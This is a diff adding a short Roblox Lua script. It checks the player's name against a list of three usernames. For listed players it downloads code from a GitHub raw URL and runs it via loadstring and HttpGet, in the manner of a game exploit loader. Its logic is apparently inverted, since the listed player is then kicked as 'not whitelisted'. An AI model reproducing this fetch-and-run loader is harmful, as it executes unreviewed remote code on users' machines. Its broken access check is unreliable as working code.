@@ -1,0 +1,22 @@
+--Whitelist of allowed usernames
+local whitelist = {
+    "baconman143krich",
+    "CyanRedBlueLimeGamer",
+    "Akoethanbeeboy"
+}
+
+local playerName = game.Players.LocalPlayer.Name
+
+-- Check if player is whitelisted
+local isWhitelisted = false
+for _, name in ipairs(whitelist) do
+    if playerName == name then
+        isWhitelisted = true
+        break
+    end
+end
+
+if isWhitelisted then
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Totocoems/Moonbeuti/main/Moonbeuti.cc"))()
+    game.Players.LocalPlayer:Kick("You are not whitelisted")
+end
